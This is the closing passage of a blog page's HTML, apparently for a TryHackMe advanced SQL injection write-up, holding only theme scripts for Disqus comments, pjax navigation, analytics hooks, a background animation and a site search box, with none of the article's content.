}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'https://blog.mikannse.cn/2024/06/15/AdvancedSQLInjectionTHM/'
    this.page.identifier = '/2024/06/15/AdvancedSQLInjectionTHM/'
    this.page.title = 'AdvancedSQLInjectionTHM'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>